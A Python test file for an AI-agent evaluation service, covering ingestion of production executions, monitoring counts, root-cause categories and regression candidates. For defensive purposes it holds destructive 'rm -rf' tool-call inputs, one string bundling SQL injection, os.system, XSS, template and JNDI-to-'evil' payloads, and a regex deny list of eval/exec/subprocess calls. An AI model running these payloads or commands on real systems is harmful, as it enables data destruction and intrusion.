"""Phase 20 — Post-release execution ingestion / monitoring tests.

Three layers:
  - Integration tests through the full HTTP stack (real ownership chain,
    real Phase 13/15 evaluation reuse) — ingestion, idempotency,
    evaluation-from-Agent-defaults, monitoring metrics, RCA, and the
    regression-candidate workflow.
  - No suite execution is involved here at all (a ProductionExecution is
    evidence about something that already ran elsewhere) — the only
    "background task" concern is Phase 19's LLM judge, mocked wherever
    grounding is exercised, matching every later-phase test file's own
    convention.
  - Security/persistence static checks.
"""

from __future__ import annotations

import re
import uuid
from pathlib import Path

import pytest
from httpx import AsyncClient
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

import app.evaluation.checks.grounding as grounding_mod
from app.agents.schemas import HallucinationCheck
from app.models.production_execution import ProductionExecution
from tests.test_suite_runs import _auth_headers, _create_agent, _create_project, _register_and_login


def _executions_url(version_id: str) -> str:
    return f"/api/v1/agent-versions/{version_id}/executions"


def _monitoring_url(version_id: str) -> str:
    return f"/api/v1/agent-versions/{version_id}/monitoring"


async def _create_version_raw(
    client: AsyncClient, token: str, agent_id: str, *, label: str = "v1"
) -> str:
    """A bare AgentVersion with no real adapter behind it — production
    executions never invoke an adapter, so LocalAdapter's own
    module_path doesn't need to resolve to anything real for these
    tests (unlike Suite Runner tests, which do invoke it)."""
    resp = await client.post(
        f"/api/v1/agents/{agent_id}/versions",
        json={
            "label": label,
            "adapter_type": "local",
            "adapter_config": {
                "module_path": "tests.fixtures.toy_agent",
                "callable_name": "invoke",
            },
            "observability_level": 2,
        },
        headers=_auth_headers(token),
    )
    assert resp.status_code == 201, resp.text
    return str(resp.json()["id"])


async def _patch_agent_defaults(
    client: AsyncClient, token: str, agent_id: str, **fields: object
) -> None:
    resp = await client.patch(
        f"/api/v1/agents/{agent_id}", json=fields, headers=_auth_headers(token)
    )
    assert resp.status_code == 200, resp.text


async def _setup(client: AsyncClient, email: str) -> tuple[str, str, str]:
    """Returns (token, agent_id, version_id)."""
    token = await _register_and_login(client, email)
    project_id = await _create_project(client, token)
    agent_id = await _create_agent(client, token, project_id)
    version_id = await _create_version_raw(client, token, agent_id)
    return token, agent_id, version_id


def _base_payload(**overrides: object) -> dict:
    payload = {
        "external_execution_id": "ext-1",
        "input": {"question": "hi"},
        "actual_output": "hello",
        "tool_calls": [],
        "latency_ms": 100,
    }
    payload.update(overrides)
    return payload


# =========================================================================
# Ingestion
# =========================================================================


async def test_valid_execution_is_accepted(client: AsyncClient) -> None:
    token, _, version_id = await _setup(client, "prod1@example.com")

    resp = await client.post(
        _executions_url(version_id), json=_base_payload(), headers=_auth_headers(token)
    )

    assert resp.status_code == 201, resp.text
    body = resp.json()
    assert body["verdict"] in ("PASS", "FAIL", "INCONCLUSIVE")
    assert body["external_execution_id"] == "ext-1"


async def test_malformed_payload_is_rejected(client: AsyncClient) -> None:
    token, _, version_id = await _setup(client, "prod2@example.com")

    resp = await client.post(
        _executions_url(version_id),
        json={"external_execution_id": "ext-1"},  # missing required "input"/"latency_ms"
        headers=_auth_headers(token),
    )

    assert resp.status_code == 422


async def test_missing_agent_version_is_rejected(client: AsyncClient) -> None:
    token = await _register_and_login(client, "prod3@example.com")
    await _create_project(client, token)

    resp = await client.post(
        _executions_url(str(uuid.uuid4())), json=_base_payload(), headers=_auth_headers(token)
    )

    assert resp.status_code == 404


async def test_cross_user_ingestion_is_rejected(client: AsyncClient) -> None:
    owner_token, _, version_id = await _setup(client, "prod4-owner@example.com")
    other_token = await _register_and_login(client, "prod4-other@example.com")

    resp = await client.post(
        _executions_url(version_id), json=_base_payload(), headers=_auth_headers(other_token)
    )

    assert resp.status_code in (403, 404)


async def test_duplicate_external_execution_id_is_idempotent(client: AsyncClient) -> None:
    token, _, version_id = await _setup(client, "prod5@example.com")

    first = await client.post(
        _executions_url(version_id), json=_base_payload(), headers=_auth_headers(token)
    )
    second = await client.post(
        _executions_url(version_id), json=_base_payload(), headers=_auth_headers(token)
    )

    assert first.status_code == 201
    assert second.status_code == 201
    assert first.json()["id"] == second.json()["id"]


async def test_duplicate_does_not_create_another_db_row(
    client: AsyncClient, db_session: AsyncSession
) -> None:
    token, _, version_id = await _setup(client, "prod6@example.com")

    for _ in range(3):
        await client.post(
            _executions_url(version_id), json=_base_payload(), headers=_auth_headers(token)
        )

    result = await db_session.execute(
        select(ProductionExecution).where(
            ProductionExecution.agent_version_id == uuid.UUID(version_id)
        )
    )
    assert len(result.scalars().all()) == 1


# =========================================================================
# Evaluation (reuses Phase 13/15, driven by Agent default_* contract fields)
# =========================================================================


async def test_safety_evidence_is_evaluated(client: AsyncClient) -> None:
    token, _, version_id = await _setup(client, "prod7@example.com")

    resp = await client.post(
        _executions_url(version_id),
        json=_base_payload(
            tool_calls=[
                {
                    "tool_name": "shell",
                    "input": {"command": "rm -rf /tmp/data"},
                    "output": "",
                    "ok": True,
                }
            ]
        ),
        headers=_auth_headers(token),
    )

    assert resp.status_code == 201
    checks = resp.json()["checks"]
    assert any(c["check_type"].startswith("safety:") and c["status"] == "fail" for c in checks)


async def test_forbidden_tool_is_detected(client: AsyncClient) -> None:
    token, agent_id, version_id = await _setup(client, "prod8@example.com")
    await _patch_agent_defaults(client, token, agent_id, default_allowed_tools=["search"])

    resp = await client.post(
        _executions_url(version_id),
        json=_base_payload(
            tool_calls=[{"tool_name": "shell", "input": {}, "output": "", "ok": True}]
        ),
        headers=_auth_headers(token),
    )

    checks = resp.json()["checks"]
    assert any(c["check_type"] == "forbidden_tool_calls" and c["status"] == "fail" for c in checks)


async def test_missing_required_tool_is_detected(client: AsyncClient) -> None:
    token, agent_id, version_id = await _setup(client, "prod9@example.com")
    await _patch_agent_defaults(client, token, agent_id, default_required_tools=["refund"])

    resp = await client.post(
        _executions_url(version_id), json=_base_payload(tool_calls=[]), headers=_auth_headers(token)
    )

    checks = resp.json()["checks"]
    assert any(
        re.match(r"tool_call\[\d+\]:refund", c["check_type"]) and c["status"] == "fail"
        for c in checks
    )
    assert resp.json()["verdict"] == "FAIL"


async def test_schema_failure_is_detected(client: AsyncClient) -> None:
    token, agent_id, version_id = await _setup(client, "prod10@example.com")
    await _patch_agent_defaults(
        client,
        token,
        agent_id,
        default_output_schema={
            "type": "object",
            "required": ["answer", "confidence"],
            "properties": {"answer": {"type": "string"}, "confidence": {"type": "number"}},
        },
    )

    resp = await client.post(
        _executions_url(version_id),
        json=_base_payload(actual_output={"answer": "42"}),
        headers=_auth_headers(token),
    )

    checks = resp.json()["checks"]
    assert any(c["check_type"] == "output_schema" and c["status"] == "fail" for c in checks)


async def test_latency_violation_is_detected(client: AsyncClient) -> None:
    token, agent_id, version_id = await _setup(client, "prod11@example.com")
    await _patch_agent_defaults(client, token, agent_id, default_latency_threshold_ms=50)

    resp = await client.post(
        _executions_url(version_id),
        json=_base_payload(latency_ms=500),
        headers=_auth_headers(token),
    )

    checks = resp.json()["checks"]
    assert any(
        c["check_type"] == "latency" and c["status"] == "fail" and "exceeds" in c["detail"]
        for c in checks
    )


async def test_grounding_evaluated_when_reference_context_present(
    client: AsyncClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    async def _fake_call_model(
        prompt: str, schema: type[HallucinationCheck], **kwargs: object
    ) -> HallucinationCheck:
        return schema(unsupported_claims=[])

    monkeypatch.setattr(grounding_mod, "call_model", _fake_call_model)

    token, _, version_id = await _setup(client, "prod12@example.com")

    resp = await client.post(
        _executions_url(version_id),
        json=_base_payload(
            reference_context="The store closes at 9pm.", actual_output="It closes at 9pm."
        ),
        headers=_auth_headers(token),
    )

    checks = resp.json()["checks"]
    grounding_check = next(c for c in checks if c["check_type"] == "grounding")
    assert grounding_check["status"] == "pass"


async def test_grounding_skipped_when_reference_context_absent(client: AsyncClient) -> None:
    token, _, version_id = await _setup(client, "prod13@example.com")

    resp = await client.post(
        _executions_url(version_id),
        json=_base_payload(reference_context=None),
        headers=_auth_headers(token),
    )

    checks = resp.json()["checks"]
    grounding_check = next(c for c in checks if c["check_type"] == "grounding")
    assert grounding_check["status"] == "skipped"


async def test_missing_evidence_never_produces_fabricated_pass(client: AsyncClient) -> None:
    """An Agent with NO default_* contract fields configured at all, and
    no reference_context supplied — there is nothing deterministic to
    evaluate, so the verdict must be INCONCLUSIVE, never a fabricated
    PASS (§4/§5)."""
    token, _, version_id = await _setup(client, "prod14@example.com")

    resp = await client.post(
        _executions_url(version_id), json=_base_payload(), headers=_auth_headers(token)
    )

    assert resp.json()["verdict"] == "INCONCLUSIVE"


async def test_objective_failure_remains_authoritative(client: AsyncClient) -> None:
    token, agent_id, version_id = await _setup(client, "prod15@example.com")
    await _patch_agent_defaults(client, token, agent_id, default_required_tools=["refund"])

    resp = await client.post(
        _executions_url(version_id),
        json=_base_payload(tool_calls=[], actual_output="looks fine"),
        headers=_auth_headers(token),
    )

    assert resp.json()["verdict"] == "FAIL"


# =========================================================================
# Monitoring
# =========================================================================


async def test_monitoring_counts_are_correct(client: AsyncClient) -> None:
    token, agent_id, version_id = await _setup(client, "prod16@example.com")
    await _patch_agent_defaults(client, token, agent_id, default_required_tools=["refund"])

    # PASS: refund called.
    await client.post(
        _executions_url(version_id),
        json=_base_payload(
            external_execution_id="e1",
            tool_calls=[{"tool_name": "refund", "input": {}, "output": "", "ok": True}],
        ),
        headers=_auth_headers(token),
    )
    # FAIL: refund not called.
    await client.post(
        _executions_url(version_id),
        json=_base_payload(external_execution_id="e2", tool_calls=[]),
        headers=_auth_headers(token),
    )
    # FAIL: refund not called.
    await client.post(
        _executions_url(version_id),
        json=_base_payload(external_execution_id="e3", tool_calls=[]),
        headers=_auth_headers(token),
    )

    resp = await client.get(_monitoring_url(version_id), headers=_auth_headers(token))
    body = resp.json()

    assert body["total_executions"] == 3
    assert body["pass_count"] == 1
    assert body["fail_count"] == 2
    assert body["inconclusive_count"] == 0
    assert body["missing_required_tool_count"] == 2


async def test_monitoring_failure_rate_is_correct(client: AsyncClient) -> None:
    token, agent_id, version_id = await _setup(client, "prod17@example.com")
    await _patch_agent_defaults(client, token, agent_id, default_required_tools=["refund"])

    for i in range(4):
        await client.post(
            _executions_url(version_id),
            json=_base_payload(external_execution_id=f"e{i}", tool_calls=[]),
            headers=_auth_headers(token),
        )

    resp = await client.get(_monitoring_url(version_id), headers=_auth_headers(token))
    assert resp.json()["failure_rate"] == 1.0


async def test_monitoring_latency_metrics_are_correct(client: AsyncClient) -> None:
    token, agent_id, version_id = await _setup(client, "prod18@example.com")
    await _patch_agent_defaults(client, token, agent_id, default_latency_threshold_ms=50)

    await client.post(
        _executions_url(version_id),
        json=_base_payload(external_execution_id="e1", latency_ms=100),
        headers=_auth_headers(token),
    )
    await client.post(
        _executions_url(version_id),
        json=_base_payload(external_execution_id="e2", latency_ms=200),
        headers=_auth_headers(token),
    )

    resp = await client.get(_monitoring_url(version_id), headers=_auth_headers(token))
    body = resp.json()
    assert body["average_latency_ms"] == 150.0
    assert body["latency_threshold_violations"] == 2


async def test_monitoring_safety_failure_count_is_correct(client: AsyncClient) -> None:
    token, _, version_id = await _setup(client, "prod19@example.com")

    await client.post(
        _executions_url(version_id),
        json=_base_payload(
            external_execution_id="e1",
            tool_calls=[
                {"tool_name": "shell", "input": {"command": "rm -rf /x"}, "output": "", "ok": True}
            ],
        ),
        headers=_auth_headers(token),
    )
    await client.post(
        _executions_url(version_id),
        json=_base_payload(external_execution_id="e2", tool_calls=[]),
        headers=_auth_headers(token),
    )

    resp = await client.get(_monitoring_url(version_id), headers=_auth_headers(token))
    assert resp.json()["safety_failure_count"] == 1


async def test_monitoring_tool_violation_counts_are_correct(client: AsyncClient) -> None:
    token, agent_id, version_id = await _setup(client, "prod20@example.com")
    await _patch_agent_defaults(
        client, token, agent_id, default_allowed_tools=["search"], default_required_tools=["refund"]
    )

    await client.post(
        _executions_url(version_id),
        json=_base_payload(
            external_execution_id="e1",
            tool_calls=[{"tool_name": "shell", "input": {}, "output": "", "ok": True}],
        ),
        headers=_auth_headers(token),
    )

    resp = await client.get(_monitoring_url(version_id), headers=_auth_headers(token))
    body = resp.json()
    assert body["forbidden_tool_count"] == 1
    assert body["missing_required_tool_count"] == 1


# =========================================================================
# RCA
# =========================================================================


async def _create_and_get_detail(
    client: AsyncClient, token: str, version_id: str, **payload_overrides: object
) -> dict:
    resp = await client.post(
        _executions_url(version_id),
        json=_base_payload(**payload_overrides),
        headers=_auth_headers(token),
    )
    execution_id = resp.json()["id"]
    detail = await client.get(
        f"{_executions_url(version_id)}/{execution_id}", headers=_auth_headers(token)
    )
    assert detail.status_code == 200
    return detail.json()


async def test_rca_detects_missing_required_tool_call(client: AsyncClient) -> None:
    token, agent_id, version_id = await _setup(client, "prod21@example.com")
    await _patch_agent_defaults(client, token, agent_id, default_required_tools=["refund"])

    body = await _create_and_get_detail(client, token, version_id, tool_calls=[])
    categories = {f["category"] for f in body["rca_categories"]}
    assert "missing_required_tool_call" in categories


async def test_rca_detects_schema_field_missing(client: AsyncClient) -> None:
    token, agent_id, version_id = await _setup(client, "prod22@example.com")
    await _patch_agent_defaults(
        client,
        token,
        agent_id,
        default_output_schema={"type": "object", "required": ["confidence"]},
    )

    body = await _create_and_get_detail(client, token, version_id, actual_output={"answer": "x"})
    categories = {f["category"] for f in body["rca_categories"]}
    assert "schema_field_missing" in categories


async def test_rca_detects_latency_exceeded(client: AsyncClient) -> None:
    token, agent_id, version_id = await _setup(client, "prod23@example.com")
    await _patch_agent_defaults(client, token, agent_id, default_latency_threshold_ms=10)

    body = await _create_and_get_detail(client, token, version_id, latency_ms=999)
    categories = {f["category"] for f in body["rca_categories"]}
    assert "latency_exceeded" in categories


async def test_rca_detects_forbidden_tool_called(client: AsyncClient) -> None:
    token, agent_id, version_id = await _setup(client, "prod24@example.com")
    await _patch_agent_defaults(client, token, agent_id, default_allowed_tools=["search"])

    body = await _create_and_get_detail(
        client,
        token,
        version_id,
        tool_calls=[{"tool_name": "shell", "input": {}, "output": "", "ok": True}],
    )
    categories = {f["category"] for f in body["rca_categories"]}
    assert "forbidden_tool_called" in categories


async def test_no_speculative_rca_when_evidence_insufficient(client: AsyncClient) -> None:
    token, _, version_id = await _setup(client, "prod25@example.com")

    body = await _create_and_get_detail(client, token, version_id)
    assert body["rca_categories"] == []


# =========================================================================
# Regression candidate
# =========================================================================


async def test_meaningful_failure_can_create_candidate(client: AsyncClient) -> None:
    token, agent_id, version_id = await _setup(client, "prod26@example.com")
    await _patch_agent_defaults(client, token, agent_id, default_required_tools=["refund"])
    suite_resp = await client.post(
        f"/api/v1/agents/{agent_id}/test-suites",
        json={"name": "Regression"},
        headers=_auth_headers(token),
    )
    suite_id = suite_resp.json()["id"]

    exec_resp = await client.post(
        _executions_url(version_id),
        json=_base_payload(
            input={"question": "Cancel my subscription and refund me."}, tool_calls=[]
        ),
        headers=_auth_headers(token),
    )
    execution_id = exec_resp.json()["id"]

    resp = await client.post(
        f"/api/v1/executions/{execution_id}/regression-candidate",
        json={
            "suite_id": suite_id,
            "name": "Regression: cancellation refund must check eligibility",
            "expected_tool_calls": [
                {"tool": "check_subscription_status", "required": True},
                {"tool": "check_refund_policy", "required": True},
                {"tool": "refund", "required": True},
            ],
        },
        headers=_auth_headers(token),
    )

    assert resp.status_code == 201, resp.text
    body = resp.json()
    assert body["status"] == "candidate"


async def test_candidate_contains_original_input_and_source_execution(client: AsyncClient) -> None:
    token, agent_id, version_id = await _setup(client, "prod27@example.com")
    suite_resp = await client.post(
        f"/api/v1/agents/{agent_id}/test-suites",
        json={"name": "Regression"},
        headers=_auth_headers(token),
    )
    suite_id = suite_resp.json()["id"]

    exec_resp = await client.post(
        _executions_url(version_id),
        json=_base_payload(input={"question": "Cancel my subscription and refund me."}),
        headers=_auth_headers(token),
    )
    execution_id = exec_resp.json()["id"]

    resp = await client.post(
        f"/api/v1/executions/{execution_id}/regression-candidate",
        json={"suite_id": suite_id, "expected_output": "must check eligibility first"},
        headers=_auth_headers(token),
    )

    body = resp.json()
    assert body["input"] == {"question": "Cancel my subscription and refund me."}
    assert body["source_execution_id"] == execution_id


async def test_candidate_contains_expected_tool_evidence(client: AsyncClient) -> None:
    token, agent_id, version_id = await _setup(client, "prod28@example.com")
    suite_resp = await client.post(
        f"/api/v1/agents/{agent_id}/test-suites",
        json={"name": "Regression"},
        headers=_auth_headers(token),
    )
    suite_id = suite_resp.json()["id"]
    exec_resp = await client.post(
        _executions_url(version_id), json=_base_payload(), headers=_auth_headers(token)
    )
    execution_id = exec_resp.json()["id"]

    resp = await client.post(
        f"/api/v1/executions/{execution_id}/regression-candidate",
        json={
            "suite_id": suite_id,
            "expected_tool_calls": [{"tool": "check_subscription_status", "required": True}],
        },
        headers=_auth_headers(token),
    )

    assert resp.json()["expected_tool_calls"] == [
        {"tool": "check_subscription_status", "required": True}
    ]


async def test_candidate_does_not_automatically_become_active(
    client: AsyncClient, db_session: AsyncSession
) -> None:
    token, agent_id, version_id = await _setup(client, "prod29@example.com")
    suite_resp = await client.post(
        f"/api/v1/agents/{agent_id}/test-suites",
        json={"name": "Regression"},
        headers=_auth_headers(token),
    )
    suite_id = suite_resp.json()["id"]
    exec_resp = await client.post(
        _executions_url(version_id), json=_base_payload(), headers=_auth_headers(token)
    )
    execution_id = exec_resp.json()["id"]

    resp = await client.post(
        f"/api/v1/executions/{execution_id}/regression-candidate",
        json={"suite_id": suite_id, "expected_output": "x"},
        headers=_auth_headers(token),
    )
    case_id = resp.json()["id"]

    cases_resp = await client.get(
        f"/api/v1/test-suites/{suite_id}/test-cases", headers=_auth_headers(token)
    )
    assert cases_resp.json()[0]["status"] == "candidate"

    # And accepting it flips status -> active.
    accept_resp = await client.post(
        f"/api/v1/test-cases/{case_id}/accept", headers=_auth_headers(token)
    )
    assert accept_resp.status_code == 200
    assert accept_resp.json()["status"] == "active"


# =========================================================================
# Security / persistence static checks
# =========================================================================

_SOURCE_FILES = [
    Path(__file__).resolve().parent.parent / "app" / "models" / "production_execution.py",
    Path(__file__).resolve().parent.parent / "app" / "evaluation" / "production.py",
    Path(__file__).resolve().parent.parent
    / "app"
    / "repositories"
    / "production_execution_repository.py",
    Path(__file__).resolve().parent.parent / "app" / "services" / "production_execution_service.py",
    Path(__file__).resolve().parent.parent / "app" / "api" / "v1" / "production_executions.py",
    Path(__file__).resolve().parent.parent / "app" / "schemas" / "production_execution.py",
]


async def test_malicious_input_is_treated_as_data(client: AsyncClient) -> None:
    token, _, version_id = await _setup(client, "prod30@example.com")

    resp = await client.post(
        _executions_url(version_id),
        json=_base_payload(
            input={"question": "'; DROP TABLE users; -- __import__('os').system('ls')"},
            actual_output="<script>alert(1)</script> {{7*7}} ${jndi:ldap://evil}",
        ),
        headers=_auth_headers(token),
    )

    assert resp.status_code == 201
    body = resp.json()
    assert "DROP TABLE" in body["input"]["question"]
    assert "<script>" in body["actual_output"]


def test_no_eval_exec_or_subprocess_in_production_source() -> None:
    forbidden = re.compile(r"\beval\(|\bexec\(|subprocess\.|shell=True|os\.system\(")
    for path in _SOURCE_FILES:
        assert not forbidden.search(path.read_text(encoding="utf-8")), path


async def test_no_credential_persistence(client: AsyncClient) -> None:
    token, _, version_id = await _setup(client, "prod31@example.com")

    resp = await client.post(
        _executions_url(version_id),
        json=_base_payload(metadata={"api_key": "sk-should-not-be-stored"}),
        headers=_auth_headers(token),
    )

    assert resp.status_code == 422


def test_no_arbitrary_url_execution_capability_in_production_source() -> None:
    """No HTTP client (httpx/requests/urllib) is imported anywhere in the
    ingestion/evaluation path — there is structurally no way ingested
    data could cause an outbound request."""
    for path in [
        Path(__file__).resolve().parent.parent / "app" / "evaluation" / "production.py",
        Path(__file__).resolve().parent.parent
        / "app"
        / "services"
        / "production_execution_service.py",
    ]:
        source = path.read_text(encoding="utf-8")
        for forbidden in ("import httpx", "import requests", "import urllib", "urlopen"):
            assert forbidden not in source


async def test_cross_user_monitoring_access_is_rejected(client: AsyncClient) -> None:
    owner_token, _, version_id = await _setup(client, "prod32-owner@example.com")
    other_token = await _register_and_login(client, "prod32-other@example.com")

    resp = await client.get(_monitoring_url(version_id), headers=_auth_headers(other_token))

    assert resp.status_code in (403, 404)


def _import_lines(source: str) -> list[str]:
    return [line for line in source.splitlines() if line.strip().startswith(("import ", "from "))]


def test_regression_candidate_schema_has_no_adapter_config_field() -> None:
    """Structural proof: RegressionCandidateCreate has no field that
    could ever reach AgentVersion.adapter_config — no pydantic Field
    definition anywhere in the schema module names it (the module
    docstring mentions the word "adapter_config" only in prose explaining
    that no field does)."""
    schema_source = (
        Path(__file__).resolve().parent.parent / "app" / "schemas" / "production_execution.py"
    ).read_text(encoding="utf-8")
    field_lines = [line for line in schema_source.splitlines() if ":" in line and "Field(" in line]
    assert not any("adapter_config" in line for line in field_lines)

    # app/services/production_execution_service.py legitimately imports
    # the AgentVersion *type* (for a type annotation) — the real
    # guarantee is that nothing in the module ever reads or writes its
    # .adapter_config attribute.
    service_source = (
        Path(__file__).resolve().parent.parent
        / "app"
        / "services"
        / "production_execution_service.py"
    ).read_text(encoding="utf-8")
    assert ".adapter_config" not in service_source


def test_candidate_creation_never_invokes_the_adapter_layer() -> None:
    """Candidate creation cannot "call the external agent with a fix" —
    nothing in the ingestion/candidate path ever imports build_adapter or
    AgentAdapter (docstrings mention them only in prose explaining that
    they are never invoked here); the only adapter-shaped concept
    anywhere is the already-completed AgentExecution the ingestion
    payload itself describes."""
    for path in [
        Path(__file__).resolve().parent.parent
        / "app"
        / "services"
        / "production_execution_service.py",
        Path(__file__).resolve().parent.parent / "app" / "evaluation" / "production.py",
    ]:
        source = path.read_text(encoding="utf-8")
        import_lines = _import_lines(source)
        assert not any("build_adapter" in line or "AgentAdapter" in line for line in import_lines)
        assert "build_adapter(" not in source
        assert "AgentAdapter(" not in source


def test_no_new_evaluator_rca_or_approval_system_introduced() -> None:
    """Structural proof: production.py imports Phase 13's evaluate() and
    Phase 15's safety/grounding checks directly rather than
    reimplementing them, and app/rca/evidence.py's own detectors are
    reused for RCA — never a second implementation of either."""
    production_source = (
        Path(__file__).resolve().parent.parent / "app" / "evaluation" / "production.py"
    ).read_text(encoding="utf-8")
    assert "from app.evaluation.engine import evaluate" in production_source
    assert "from app.evaluation.checks.safety import" in production_source
    assert "from app.evaluation.checks.grounding import" in production_source

    service_source = (
        Path(__file__).resolve().parent.parent
        / "app"
        / "services"
        / "production_execution_service.py"
    ).read_text(encoding="utf-8")
    assert "from app.rca.evidence import" in service_source

    models_dir = Path(__file__).resolve().parent.parent / "app" / "models"
    names = [p.name.lower() for p in models_dir.glob("*.py")]
    for forbidden in ("monitoringevent", "productionfailure", "productionrca", "regressionresult"):
        assert not any(forbidden in name for name in names)
